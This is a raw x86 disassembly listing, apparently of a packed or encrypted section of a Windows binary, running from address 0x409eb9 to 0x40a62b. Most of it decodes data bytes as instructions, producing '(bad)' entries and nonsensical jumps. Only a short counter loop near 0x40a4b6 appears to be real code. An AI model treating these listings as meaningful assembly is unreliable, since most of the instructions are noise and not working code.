  409eb9:	cwde   
  409eba:	jns    0x409f30
  409ebc:	xchg   BYTE PTR [ecx+0x50],dh
  409ebf:	fsubr  QWORD PTR [ebp-0x43f8ffb6]
  409ec5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ec6:	jmp    0xcadc1d89
  409ecb:	xchg   edi,eax
  409ecc:	add    dl,BYTE PTR [ecx-0xd]
  409ecf:	frstor [ecx-0x5c]
  409ed2:	imul   DWORD PTR [ebx]
  409ed4:	inc    edi
  409ed5:	retf   0x97e7
  409ed8:	or     eax,DWORD PTR [ecx]
  409eda:	jle    0x409eb8
  409edc:	mov    ds:0x6361d7e3,al
  409ee1:	pop    esi
  409ee2:	fcom   QWORD PTR [esi+0x290e8f13]
  409ee8:	sub    edx,DWORD PTR [eax-0xc]
  409eeb:	icebp  
  409eec:	ror    BYTE PTR [esi],0x79
  409eef:	das    
  409ef0:	push   ebx
  409ef1:	and    eax,0x73d2efb3
  409ef6:	ret    0xe681
  409ef9:	push   ds
  409efa:	sbb    eax,0xb6c3346f
  409eff:	fldpi  
  409f01:	jne    0x409ed8
  409f03:	(bad)  
  409f04:	lods   al,BYTE PTR ds:[esi]
  409f05:	jo     0x409f83
  409f07:	mov    ecx,0x142ed769
  409f0c:	jae    0x409f6a
  409f0e:	in     eax,0x31
  409f10:	shr    esp,cl
  409f12:	and    BYTE PTR [eax],ah
  409f14:	and    al,0x6c
  409f16:	fiadd  WORD PTR [edx]
  409f18:	scas   al,BYTE PTR es:[edi]
  409f19:	call   0x9f42:0x69852f0c
  409f20:	lods   al,BYTE PTR ds:[esi]
  409f21:	adc    esp,edx
  409f23:	pop    ebx
  409f24:	js     0x409f07
  409f26:	stos   BYTE PTR es:[edi],al
  409f27:	aas    
  409f28:	shl    DWORD PTR [eax-0xce14dc7],0x69
  409f2f:	jmp    0x78a998a2
  409f34:	call   0xceef94a8
  409f39:	sbb    bl,BYTE PTR [ecx+0x2de083cf]
  409f3f:	fst    DWORD PTR [ebp-0x66]
  409f42:	sub    dl,BYTE PTR [ecx]
  409f44:	or     DWORD PTR [esi],0xffffffcf
  409f47:	ja     0x409edb
  409f49:	ins    BYTE PTR es:[edi],dx
  409f4a:	inc    ebx
  409f4b:	nop
  409f4c:	xchg   BYTE PTR [esi+0x2b],bl
  409f4f:	inc    ebx
  409f50:	popa   
  409f51:	jns    0x409fc7
  409f53:	loope  0x409fc1
  409f55:	adc    eax,0x230e211e
  409f5a:	aas    
  409f5b:	or     bh,BYTE PTR [edi+0x16]
  409f5e:	and    al,0xd1
  409f60:	cli    
  409f61:	(bad)  
  409f62:	out    dx,eax
  409f63:	js     0x409f7a
  409f65:	or     DWORD PTR [edx+0x10],edi
  409f68:	pop    ebx
  409f69:	pop    ss
  409f6a:	and    DWORD PTR [edi+0x628ff3df],esi
  409f70:	dec    ebx
  409f71:	ja     0x409f79
  409f73:	adc    eax,0x3a2f9338
  409f78:	rol    DWORD PTR [ebx],0xe8
  409f7b:	and    ah,BYTE PTR [ebx-0x2d3d6b69]
  409f81:	jb     0x409f0a
  409f83:	mov    esp,0x11eba311
  409f88:	push   DWORD PTR [esi+0x71]
  409f8b:	pop    edi
  409f8c:	pop    esp
  409f8d:	pushf  
  409f8e:	fwait
  409f8f:	xor    bh,BYTE PTR [ebp+0xd]
  409f92:	test   al,0xc0
  409f94:	or     edx,esi
  409f96:	ja     0x409f46
  409f98:	test   BYTE PTR [ebx],dh
  409f9a:	(bad)  
  409f9c:	in     eax,dx
  409f9d:	add    DWORD PTR [ebx],ebx
  409f9f:	adc    al,0x16
  409fa1:	inc    eax
  409fa2:	(bad)  
  409fa3:	push   esi
  409fa4:	mov    bl,0xa3
  409fa6:	jbe    0x409f9c
  409fa8:	test   ah,0x0
  409fab:	jmp    0xce73:0xe1f9f7c1
  409fb2:	mov    al,0x1
  409fb4:	aas    
  409fb5:	cli    
  409fb6:	or     al,0xea
  409fb8:	test   eax,0x5fd24336
  409fbd:	cmp    al,0xe1
  409fbf:	mov    ebp,0x8da155bc
  409fc4:	sub    DWORD PTR [edi],edx
  409fc6:	test   BYTE PTR [ecx],0xf8
  409fc9:	push   eax
  409fca:	fnsave [eax+0x51]
  409fcd:	fwait
  409fce:	ret    
  409fcf:	fild   DWORD PTR [ebx-0x3c7b01fb]
  409fd5:	inc    ecx
  409fd6:	jnp    0x40a054
  409fd8:	mov    dh,0x25
  409fda:	vorpd  ymm5,ymm3,YMMWORD PTR [ebx]
  409fde:	scas   eax,DWORD PTR es:[edi]
  409fdf:	mov    al,BYTE PTR [esi-0x29]
  409fe2:	add    edi,DWORD PTR [esi]
  409fe4:	sub    bl,bl
  409fe6:	stos   DWORD PTR es:[edi],eax
  409fe7:	sbb    edx,esp
  409fe9:	cmp    al,0xea
  409feb:	dec    ebx
  409fec:	pop    ebp
  409fed:	push   edx
  409fee:	call   0x5ddb84b6
  409ff3:	or     cl,BYTE PTR [eax+eax*2]
  409ff6:	test   eax,0x890740a6
  409ffb:	cmp    BYTE PTR [ecx+eax*4-0x3a331e19],ch
  40a002:	fidiv  DWORD PTR [esi]
  40a004:	mov    fs,WORD PTR [eax+edx*1+0x9]
  40a008:	inc    edi
  40a009:	adc    al,0x8f
  40a00b:	jle    0x40a026
  40a00d:	xchg   edi,eax
  40a00e:	call   0x75b9:0x73d875b6
  40a015:	dec    esp
  40a016:	lds    eax,FWORD PTR [ecx-0x10a6cfaa]
  40a01c:	sub    DWORD PTR [esi+0x362bbb46],ecx
  40a022:	jne    0x40a0a3
  40a024:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a025:	pop    esi
  40a026:	add    edi,edx
  40a028:	outs   dx,BYTE PTR ds:[esi]
  40a029:	cli    
  40a02a:	cmp    al,0x28
  40a02c:	mov    edi,0x9205b8c0
  40a031:	int    0x62
  40a033:	xchg   ecx,eax
  40a034:	push   0x202382af
  40a039:	scas   al,BYTE PTR es:[edi]
  40a03a:	loopne 0x40a01e
  40a03c:	sub    esi,edi
  40a03e:	lods   al,BYTE PTR ds:[esi]
  40a03f:	retf   
  40a040:	gs pop ss
  40a042:	clc    
  40a043:	adc    ecx,DWORD PTR [ecx+0x6e718087]
  40a049:	test   eax,0x684f9abd
  40a04e:	addr16 push eax
  40a050:	dec    esi
  40a051:	imul   DWORD PTR [edx+0x6f]
  40a054:	push   esi
  40a055:	dec    ecx
  40a056:	sub    ecx,DWORD PTR [edi+0x351bcc2f]
  40a05c:	sahf   
  40a05d:	int    0x98
  40a05f:	mov    edi,0xabf169ad
  40a064:	(bad)  
  40a065:	xchg   esi,eax
  40a066:	out    0xc,eax
  40a068:	test   al,0x68
  40a06a:	inc    eax
  40a06b:	fcomp  DWORD PTR [edx-0x77b9309b]
  40a071:	mov    ecx,0x328da2d8
  40a076:	jl     0x40a0d7
  40a078:	sbb    al,0x47
  40a07a:	test   eax,0xb724c0a1
  40a07f:	call   0x1f8b:0xa98c7fdd
  40a086:	add    al,0xae
  40a088:	cmc    
  40a089:	popf   
  40a08a:	and    dh,BYTE PTR [esi+0x7a7f2540]
  40a090:	test   BYTE PTR [ebp-0x25],ah
  40a093:	test   eax,0xed8ee0a2
  40a098:	inc    esi
  40a099:	imul   eax,DWORD PTR [eax+ebx*8-0x54],0xffffff86
  40a09e:	pushf  
  40a09f:	xor    BYTE PTR [ebp+0x4145b3e5],cl
  40a0a5:	push   ss
  40a0a6:	cmp    ah,BYTE PTR [eax+0x5f263bd9]
  40a0ac:	or     al,0xcd
  40a0ae:	or     al,0xf3
  40a0b0:	ret    
  40a0b1:	push   ds
  40a0b2:	add    edi,DWORD PTR [edx]
  40a0b4:	scas   eax,DWORD PTR es:[edi]
  40a0b5:	mov    dl,0x53
  40a0b7:	fild   WORD PTR [edx+0x3086a635]
  40a0bd:	jno    0x40a0e2
  40a0bf:	das    
  40a0c0:	dec    esp
  40a0c1:	mov    ds:0xa63a5417,al
  40a0c6:	std    
  40a0c7:	stc    
  40a0c8:	push   cs
  40a0c9:	popf   
  40a0ca:	pop    es
  40a0cb:	stos   DWORD PTR es:[edi],eax
  40a0cc:	cmp    al,0x27
  40a0ce:	sub    ecx,DWORD PTR [edi-0x4b8c423d]
  40a0d4:	pop    ebx
  40a0d5:	outs   dx,BYTE PTR ds:[esi]
  40a0d6:	pop    ebp
  40a0d7:	jecxz  0x40a0ed
  40a0d9:	sub    DWORD PTR [edi-0x2b],ebx
  40a0dc:	xchg   ebx,eax
  40a0dd:	pop    edi
  40a0de:	pop    edx
  40a0df:	fdiv   QWORD PTR [eax+0xd4fb85f]
  40a0e5:	aam    0xa8
  40a0e7:	mov    ah,BYTE PTR [ebx-0x61bc45d6]
  40a0ed:	out    0x3d,eax
  40a0ef:	in     eax,dx
  40a0f0:	clc    
  40a0f1:	xchg   bl,al
  40a0f3:	pop    ds
  40a0f4:	out    0xd1,al
  40a0f6:	add    ecx,ebx
  40a0f8:	pusha  
  40a0f9:	lahf   
  40a0fa:	xchg   ebx,eax
  40a0fb:	cmp    DWORD PTR [edi-0x32],edx
  40a0fe:	mov    DWORD PTR [ebp+0x7b032575],edi
  40a104:	lea    edx,[esi-0x13]
  40a107:	jne    0x40a130
  40a109:	pop    ecx
  40a10a:	lock cli 
  40a10c:	mov    bh,0x54
  40a10e:	daa    
  40a10f:	inc    esp
  40a110:	xchg   edi,eax
  40a111:	adc    BYTE PTR [edi+esi*8+0x3272bb93],0x22
  40a119:	push   eax
  40a11a:	mov    eax,0xd24a0a64
  40a11f:	pop    ebp
  40a120:	xchg   ebx,eax
  40a121:	pop    esp
  40a122:	sbb    ch,BYTE PTR [edi]
  40a124:	fnsave [ebp-0x63]
  40a127:	(bad)  
  40a128:	xor    DWORD PTR [ecx+ebx*8],ecx
  40a12b:	(bad)  
  40a12c:	xchg   ebp,eax
  40a12d:	shr    BYTE PTR [edi-0x35],cl
  40a130:	adc    eax,0x9eb81e3
  40a135:	adc    al,0x3e
  40a137:	cwde   
  40a138:	xor    DWORD PTR [edx+0x57],esi
  40a13b:	aas    
  40a13c:	dec    ebp
  40a13d:	cmc    
  40a13e:	ror    BYTE PTR [esi+ecx*8],1
  40a141:	inc    ecx
  40a142:	cmp    al,0x6b
  40a144:	cmp    al,0xf3
  40a146:	jb     0x40a132
  40a148:	outs   dx,BYTE PTR ds:[esi]
  40a149:	stos   BYTE PTR es:[edi],al
  40a14a:	stc    
  40a14b:	mov    ecx,0x9b5a8d5a
  40a150:	sub    al,0xec
  40a152:	and    BYTE PTR ds:0x988944b7,0xc1
  40a159:	sbb    BYTE PTR [ebp+ebx*8-0x363a517d],al
  40a160:	lea    esp,[edi+0x5dbc8fe8]
  40a166:	xor    eax,esi
  40a168:	jmp    0x40a4b5
  40a16d:	push   ebp
  40a16e:	or     ah,al
  40a170:	int3   
  40a171:	popa   
  40a172:	hlt    
  40a173:	jno    0x40a108
  40a175:	jae    0x40a11f
  40a177:	and    dh,ah
  40a179:	and    DWORD PTR [ebx-0x18c6860c],esi
  40a17f:	jle    0x40a1ff
  40a181:	cs jge 0x40a202
  40a184:	jle    0x40a10e
  40a186:	jl     0x40a194
  40a188:	fdiv   QWORD PTR [edx]
  40a18a:	jmp    0x7124adc2
  40a18f:	and    al,BYTE PTR [ebx+0x3dc6707c]
  40a195:	mov    bh,0xa0
  40a197:	repz xchg ecx,eax
  40a199:	and    BYTE PTR [esi+0x3e],cl
  40a19c:	test   BYTE PTR ds:0xf122a5ea,ch
  40a1a2:	mov    eax,ds:0x6d6b4da1
  40a1a7:	push   0x78
  40a1a9:	ret    0x436e
  40a1ac:	mov    ecx,0x68aae7cb
  40a1b1:	aad    0x7
  40a1b3:	into   
  40a1b4:	push   es
  40a1b5:	inc    di
  40a1b7:	mov    esp,DWORD PTR [eax]
  40a1b9:	mov    DWORD PTR [ecx+edx*1+0x20],edi
  40a1bd:	xchg   edx,eax
  40a1be:	lods   al,BYTE PTR ds:[esi]
  40a1bf:	xchg   ebx,eax
  40a1c0:	(bad)  
  40a1c1:	(bad)  
  40a1c4:	sbb    BYTE PTR [eax+esi*8+0x71],ah
  40a1c8:	sbb    ah,dh
  40a1ca:	clc    
  40a1cb:	add    al,0x8a
  40a1cd:	mov    ch,0x43
  40a1cf:	pop    edi
  40a1d0:	sub    esi,edx
  40a1d2:	and    ch,BYTE PTR [esi+0x41]
  40a1d5:	or     DWORD PTR [ebp+0x18b6e549],ebx
  40a1db:	ret    
  40a1dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a1dd:	jge    0x40a19d
  40a1df:	rol    BYTE PTR [esi],1
  40a1e1:	cwde   
  40a1e2:	pop    ebx
  40a1e3:	xchg   esp,eax
  40a1e4:	test   eax,0x1afe0520
  40a1e9:	cmp    eax,0xa437465
  40a1ee:	scas   eax,DWORD PTR es:[edi]
  40a1ef:	or     edi,DWORD PTR [ecx]
  40a1f1:	aad    0x7a
  40a1f3:	loopne 0x40a1ff
  40a1f5:	adc    al,0x21
  40a1f7:	retf   
  40a1f8:	stos   DWORD PTR es:[edi],eax
  40a1f9:	dec    ebp
  40a1fa:	dec    ebp
  40a1fb:	lock out dx,al
  40a1fd:	fwait
  40a1fe:	add    eax,0xd363943d
  40a203:	xchg   edx,eax
  40a204:	cmp    esp,DWORD PTR [edx]
  40a206:	add    eax,0x52a867ed
  40a20b:	cmp    BYTE PTR [edx],ch
  40a20d:	xchg   ebp,ebx
  40a20f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a210:	push   ss
  40a211:	clc    
  40a212:	dec    ebx
  40a213:	jmp    0x8921c39e
  40a218:	sbb    eax,0x15ea1f2b
  40a21d:	mov    esp,0x81d66c55
  40a222:	push   edi
  40a223:	push   0x6b1e3009
  40a228:	stos   BYTE PTR es:[edi],al
  40a229:	and    edx,ebp
  40a22b:	mov    esp,0x6d4da760
  40a230:	cdq    
  40a231:	push   ebx
  40a232:	cdq    
  40a233:	test   DWORD PTR [ecx-0x7],0x1068156e
  40a23a:	sbb    DWORD PTR [edi*8+0x53a3e16b],edx
  40a241:	sub    eax,0x3ec8fe61
  40a246:	jae    0x40a27d
  40a248:	pushf  
  40a249:	push   es
  40a24a:	leave  
  40a24b:	sub    eax,0x9c5e872
  40a250:	fldcw  WORD PTR ss:[edx]
  40a253:	cmp    BYTE PTR [edx+0x4d],dh
  40a256:	and    al,0xc2
  40a258:	and    ecx,edx
  40a25a:	cli    
  40a25b:	or     esp,DWORD PTR [esp+ecx*1+0x35]
  40a25f:	rol    BYTE PTR [esi+0x3f],1
  40a262:	inc    eax
  40a263:	popf   
  40a264:	das    
  40a265:	ds pop edx
  40a267:	add    edi,DWORD PTR [esi-0x7ecdd28b]
  40a26d:	add    DWORD PTR [edx-0x792196bd],eax
  40a273:	push   esp
  40a274:	sub    al,0xe3
  40a276:	mov    esp,?
  40a278:	popa   
  40a279:	push   0x55
  40a27b:	test   bh,dl
  40a27d:	push   ds
  40a27e:	mov    bh,0xc8
  40a280:	rcr    DWORD PTR [esi-0x409d5d0c],cl
  40a286:	popf   
  40a287:	push   ecx
  40a288:	jne    0x40a307
  40a28a:	arpl   WORD PTR [edx+0x706d4253],sp
  40a290:	pop    edi
  40a291:	ins    DWORD PTR es:[edi],dx
  40a292:	mov    cl,0xfb
  40a294:	in     al,0xce
  40a296:	xor    ecx,DWORD PTR [eax-0x524d2788]
  40a29c:	in     eax,0xdc
  40a29e:	inc    ebx
  40a29f:	push   esi
  40a2a0:	ins    DWORD PTR es:[edi],dx
  40a2a1:	sbb    DWORD PTR [edi+ebp*2],ebx
  40a2a4:	sub    BYTE PTR [eax-0x1ed6dfe3],0x3a
  40a2ab:	ret    
  40a2ac:	push   ds
  40a2ad:	cmp    edx,esp
  40a2af:	neg    BYTE PTR [eax+0x20]
  40a2b2:	add    ah,ch
  40a2b4:	cli    
  40a2b5:	mov    esi,0x5a7c8f6f
  40a2ba:	mov    al,ds:0xfe33cff9
  40a2bf:	and    al,0x60
  40a2c1:	repnz and esi,DWORD PTR [esi-0x30]
  40a2c5:	dec    ecx
  40a2c6:	xor    eax,0x79434c35
  40a2cb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2cc:	push   0x3c8df26e
  40a2d1:	scas   al,BYTE PTR es:[edi]
  40a2d2:	push   edx
  40a2d3:	mov    ds:0x80cf252f,al
  40a2d8:	pop    edx
  40a2d9:	fs xor al,0x55
  40a2dc:	ja     0x40a356
  40a2de:	mov    ebp,0x4a67190
  40a2e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a2e4:	jbe    0x40a278
  40a2e6:	fld    DWORD PTR [ecx]
  40a2e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2e9:	mov    gs,WORD PTR [edx-0x7e]
  40a2ec:	ds inc edi
  40a2ee:	push   0xd3d5e497
  40a2f3:	dec    esi
  40a2f4:	cmc    
  40a2f5:	cmp    edx,edi
  40a2f7:	imul   esp,DWORD PTR [eax-0x3d],0x2a
  40a2fb:	(bad)  
  40a2fc:	sub    eax,0x2c8c190d
  40a301:	sbb    DWORD PTR [eax-0x38],ecx
  40a304:	or     BYTE PTR [edx+esi*4-0xd250bd9],ah
  40a30b:	cmp    BYTE PTR [ebx-0x5c],bh
  40a30e:	inc    ecx
  40a30f:	add    esp,esp
  40a311:	(bad)  
  40a312:	xor    DWORD PTR [eax+0x3f],ecx
  40a315:	push   0x3d
  40a317:	xor    al,0x21
  40a319:	mov    bh,0x83
  40a31b:	jmp    0x1ab9b1ed
  40a320:	leave  
  40a321:	push   ss
  40a322:	push   ecx
  40a323:	aaa    
  40a324:	add    DWORD PTR [esi-0x21],0x76
  40a328:	jno    0x40a2e6
  40a32a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a32b:	sbb    BYTE PTR [edx-0x45b2a9ae],cl
  40a331:	gs and eax,0x239642aa
  40a337:	loopne 0x40a35c
  40a339:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a33a:	pop    ebp
  40a33b:	dec    edx
  40a33c:	jns    0x40a30a
  40a33e:	and    dl,dh
  40a340:	mov    DWORD PTR [esi],esi
  40a342:	dec    edi
  40a343:	or     bl,bl
  40a345:	repz fisttp QWORD PTR [ecx+0x2b8fc0db]
  40a34c:	enter  0x48fd,0x7
  40a350:	outs   dx,DWORD PTR ds:[esi]
  40a351:	mov    eax,ds:0x3cbbd232
  40a356:	fwait
  40a357:	repz add edi,DWORD PTR [edi-0x7d]
  40a35b:	int3   
  40a35c:	add    ecx,ebx
  40a35e:	fdiv   DWORD PTR [ebx+0x19]
  40a361:	jno    0x40a374
  40a363:	xor    ebp,0x7a
  40a366:	cdq    
  40a367:	pop    eax
  40a368:	(bad)  
  40a369:	or     al,0xaa
  40a36b:	out    0xc7,al
  40a36d:	icebp  
  40a36e:	jl     0x40a368
  40a370:	clc    
  40a371:	mov    ebx,DWORD PTR [ebp-0x73]
  40a374:	call   0xb823cc8a
  40a379:	adc    cl,al
  40a37b:	in     al,dx
  40a37c:	fwait
  40a37d:	sub    al,0x36
  40a37f:	ds pop ebp
  40a381:	jmp    0xe43d2327
  40a386:	test   eax,0x2d15c36b
  40a38b:	les    ebx,FWORD PTR [ebp*8-0x3efea518]
  40a392:	jp     0x40a3bc
  40a394:	in     eax,0x48
  40a396:	pop    ebx
  40a397:	imul   ecx,DWORD PTR [esi],0xffffffe1
  40a39a:	jg     0x40a409
  40a39c:	ins    BYTE PTR es:[edi],dx
  40a39d:	pushf  
  40a39e:	out    dx,al
  40a39f:	cwde   
  40a3a0:	jne    0x40a346
  40a3a2:	mov    ah,0x87
  40a3a4:	loope  0x40a339
  40a3a6:	in     al,0x2e
  40a3a8:	jnp    0x40a3e4
  40a3aa:	jb     0x40a392
  40a3ac:	push   es
  40a3ad:	aaa    
  40a3ae:	mov    ebx,0xe1b7268a
  40a3b3:	test   al,0x86
  40a3b5:	cmc    
  40a3b6:	and    DWORD PTR [edx-0x23],ebx
  40a3b9:	and    esp,ecx
  40a3bb:	add    DWORD PTR [edi-0x70],edx
  40a3be:	out    0x8a,al
  40a3c0:	inc    edi
  40a3c1:	sub    BYTE PTR [ecx+edi*8],al
  40a3c4:	ror    DWORD PTR [edx+0x1f],0x31
  40a3c8:	gs ret 
  40a3ca:	sbb    ecx,edi
  40a3cc:	std    
  40a3cd:	xor    bl,BYTE PTR [edx+0x44]
  40a3d0:	jo     0x40a3ca
  40a3d2:	lds    edx,FWORD PTR [ebp+0x5c6168b]
  40a3d8:	mov    esp,0x28563fef
  40a3dd:	cld    
  40a3de:	aad    0xf9
  40a3e0:	clc    
  40a3e1:	dec    edi
  40a3e2:	pop    ss
  40a3e3:	cli    
  40a3e4:	push   0x657e66a1
  40a3e9:	dec    esp
  40a3ea:	xchg   dl,cl
  40a3ec:	fdivr  st,st(2)
  40a3ee:	int    0x87
  40a3f0:	mov    esi,0x18804dca
  40a3f5:	adc    esi,DWORD PTR [edx]
  40a3f7:	fsub   st,st(4)
  40a3f9:	xchg   ecx,eax
  40a3fa:	pop    esi
  40a3fb:	je     0x40a3d3
  40a3fd:	mov    ch,0x33
  40a3ff:	out    dx,eax
  40a400:	jns    0x40a461
  40a402:	or     cl,bl
  40a404:	inc    esp
  40a405:	lods   eax,DWORD PTR ds:[esi]
  40a406:	fisubr DWORD PTR [ebx]
  40a408:	pop    ecx
  40a409:	pop    ss
  40a40a:	fstp   TBYTE PTR [eax-0x2486428a]
  40a410:	fs xchg ebx,eax
  40a412:	aas    
  40a413:	inc    edi
  40a414:	xlat   BYTE PTR ds:[ebx]
  40a415:	mov    ds:0x46564ce5,eax
  40a41a:	add    al,0x70
  40a41c:	xchg   ecx,eax
  40a41d:	pop    esp
  40a41e:	push   0x5f1ba240
  40a423:	mov    ah,0x4b
  40a425:	ja     0x40a3d0
  40a427:	add    BYTE PTR [ebp+esi*8-0x303ae9a3],0x2a
  40a42f:	out    0x4b,al
  40a431:	mov    ds:0x83fbe517,al
  40a436:	fwait
  40a437:	adc    BYTE PTR [eax+0x2e],dh
  40a43a:	cmp    dh,ch
  40a43c:	cs jno 0x40a41c
  40a43f:	test   DWORD PTR [edx-0x2c50fda4],eax
  40a445:	and    DWORD PTR gs:[edi],0xffffffd3
  40a449:	jle    0x40a490
  40a44b:	inc    ecx
  40a44c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a44d:	das    
  40a44e:	je     0x40a456
  40a450:	fist   DWORD PTR [eax+0x2e]
  40a453:	sar    BYTE PTR [esi+0x1],1
  40a456:	cld    
  40a457:	and    al,0x8
  40a459:	mov    dh,0xb
  40a45b:	aam    0xd9
  40a45d:	mov    ds:0xc702d521,al
  40a462:	in     eax,dx
  40a463:	sbb    al,0xeb
  40a465:	bound  edx,QWORD PTR [ecx+eax*4-0x40ddd6a4]
  40a46c:	ret    0xfa95
  40a46f:	or     DWORD PTR [ebx],esi
  40a471:	loope  0x40a4aa
  40a473:	pop    ecx
  40a474:	cmp    ebp,edx
  40a476:	fadd   QWORD PTR [edx-0x56]
  40a479:	and    edx,DWORD PTR [ebx]
  40a47b:	mov    edx,0x601e321b
  40a480:	adc    BYTE PTR [eax+esi*4-0x43],0x73
  40a485:	inc    ebx
  40a486:	ins    DWORD PTR es:[edi],dx
  40a487:	xor    BYTE PTR [edx],bh
  40a489:	out    dx,eax
  40a48a:	add    eax,0x9066c71f
  40a48f:	int    0x34
  40a491:	push   edx
  40a492:	fcom   QWORD PTR [eax-0x3]
  40a495:	sahf   
  40a496:	arpl   bp,si
  40a498:	xor    eax,0xafdeb465
  40a49d:	cli    
  40a49e:	sub    ebx,DWORD PTR [esi]
  40a4a0:	add    eax,0xbbd417e7
  40a4a5:	add    eax,0x1240d860
  40a4aa:	mov    dl,0xb8
  40a4ac:	test   esp,eax
  40a4ae:	mov    ds:0x4f1d475c,al
  40a4b3:	pop    edx
  40a4b4:	mov    al,0x3
  40a4b6:	mov    DWORD PTR [ecx+0x4302f125],0x0
  40a4c0:	add    BYTE PTR [ebx],dh
  40a4c2:	fisttp DWORD PTR [ebx]
  40a4c4:	sbb    eax,0x4302f1
  40a4c9:	inc    ebx
  40a4ca:	mov    DWORD PTR ds:0x4302f1,ebx
  40a4d0:	cmp    DWORD PTR ds:0x4302f1,0x2a
  40a4d7:	jne    0x40a4e8
  40a4dd:	push   0x43f7
  40a4e2:	call   DWORD PTR ds:0x42eabb
  40a4e8:	cmp    DWORD PTR ds:0x4302f1,0x1d
  40a4ef:	jb     0x40a4c1
  40a4f5:	mov    DWORD PTR [ecx],eax
  40a4f7:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  40a4fe:	sub    ebx,ecx
  40a500:	jmp    0x40a84d
  40a505:	shr    BYTE PTR [esi],cl
  40a507:	mov    eax,0x736960ed
  40a50c:	xor    DWORD PTR [ebx],ebp
  40a50e:	jne    0x40a4fa
  40a510:	outs   dx,DWORD PTR ss:[esi]
  40a512:	nop
  40a513:	fs mov ah,0xe9
  40a516:	loop   0x40a596
  40a518:	jle    0x40a548
  40a51a:	jge    0x40a59a
  40a51c:	jle    0x40a4b8
  40a51e:	stos   DWORD PTR es:[edi],eax
  40a51f:	ja     0x40a4b6
  40a521:	sbb    ecx,ecx
  40a523:	cld    
  40a524:	rcl    DWORD PTR [esi-0x15e19d5f],0x1d
  40a52b:	frstor [esp+esi*1+0x37]
  40a52f:	adc    DWORD PTR [ecx-0x6e],ecx
  40a532:	in     eax,dx
  40a533:	ret    
  40a534:	jmp    0x40a55a
  40a536:	inc    eax
  40a537:	inc    edx
  40a538:	stc    
  40a539:	es test al,0x7c
  40a53c:	inc    ebx
  40a53d:	loope  0x40a4e6
  40a53f:	xchg   DWORD PTR es:[edx],eax
  40a542:	xor    al,0xae
  40a544:	push   0xffffffba
  40a546:	jge    0x40a4d1
  40a548:	stos   DWORD PTR es:[edi],eax
  40a549:	pmulhw mm0,QWORD PTR [esi+ebx*4-0x4f]
  40a54e:	and    edx,edi
  40a550:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a551:	xor    al,BYTE PTR [eax-0x8]
  40a554:	pushf  
  40a555:	frstor [eax]
  40a557:	or     al,0xa
  40a559:	in     eax,dx
  40a55a:	or     al,0x29
  40a55c:	pop    es
  40a55d:	jle    0x40a57e
  40a55f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a560:	test   ebx,esp
  40a562:	jo     0x40a502
  40a564:	repnz lods eax,DWORD PTR ds:[esi]
  40a566:	mov    dh,0xda
  40a568:	hlt    
  40a569:	mov    eax,ds:0xe959c9e7
  40a56e:	pop    ss
  40a56f:	fist   WORD PTR [ecx]
  40a571:	mov    eax,0x926e896a
  40a576:	ss push esp
  40a578:	ins    DWORD PTR es:[edi],dx
  40a579:	loope  0x40a556
  40a57b:	ror    DWORD PTR [edi],0x4d
  40a57e:	jno    0x40a5f4
  40a580:	push   ds
  40a581:	fwait
  40a582:	(bad)  
  40a583:	das    
  40a584:	int3   
  40a585:	xor    ebx,DWORD PTR [edx-0x57029eb5]
  40a58b:	das    
  40a58c:	into   
  40a58d:	adc    al,0x35
  40a58f:	icebp  
  40a590:	stos   BYTE PTR es:[edi],al
  40a591:	push   ds
  40a592:	out    dx,al
  40a593:	test   BYTE PTR [esi-0xc],bh
  40a596:	jbe    0x40a5cd
  40a598:	mov    eax,ds:0x54de754b
  40a59d:	adc    al,0x52
  40a59f:	mov    eax,0xa6de0ab8
  40a5a4:	jbe    0x40a5b2
  40a5a6:	mov    dl,0x8
  40a5a8:	repnz test BYTE PTR [edi+0x4e],cl
  40a5ac:	jmp    0xc197:0x215c83c9
  40a5b3:	ins    DWORD PTR es:[edi],dx
  40a5b4:	or     bh,BYTE PTR [ebx]
  40a5b6:	mov    esp,?
  40a5b8:	mov    DWORD PTR [edx],edi
  40a5ba:	loope  0x40a587
  40a5bc:	in     eax,dx
  40a5bd:	jle    0x40a540
  40a5bf:	jle    0x40a5a4
  40a5c1:	cmp    al,0xb0
  40a5c3:	xor    DWORD PTR [edx],0x56
  40a5c6:	push   esi
  40a5c7:	jge    0x40a5f6
  40a5c9:	add    DWORD PTR [ebx-0x2543780f],esp
  40a5cf:	dec    esp
  40a5d0:	mul    ecx
  40a5d2:	repnz mov eax,0x7ab0764b
  40a5d8:	adc    al,0x46
  40a5da:	fadd   QWORD PTR [esi-0x25]
  40a5dd:	and    DWORD PTR [ebx+0x49],edi
  40a5e0:	sahf   
  40a5e1:	inc    esp
  40a5e2:	xor    edi,DWORD PTR [esi-0x15]
  40a5e5:	(bad)  
  40a5e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5e7:	mov    cl,0x16
  40a5e9:	xchg   edi,eax
  40a5ea:	ret    0xd0d2
  40a5ed:	lock retf 
  40a5ef:	stc    
  40a5f0:	stc    
  40a5f1:	(bad)  
  40a5f3:	xor    eax,0x5e83720b
  40a5f8:	and    DWORD PTR [ebx+0x38f9d6c0],0x76
  40a5ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a600:	add    BYTE PTR ds:0xb3f48089,bh
  40a606:	sub    eax,0xc11a5808
  40a60b:	xchg   ebp,eax
  40a60c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a60d:	cmp    BYTE PTR [edi],bh
  40a60f:	aaa    
  40a610:	push   eax
  40a611:	fwait
  40a612:	mov    bl,0x14
  40a614:	aas    
  40a615:	enter  0xa31,0x2
  40a619:	mov    eax,ds:0x5b19ee8c
  40a61e:	imul   ebp,esp,0x4e8aac21
  40a624:	and    BYTE PTR [ecx+0x43f2a570],0xb4
  40a62b:	dec    BYTE PTR [eax+0x2716a4fa]
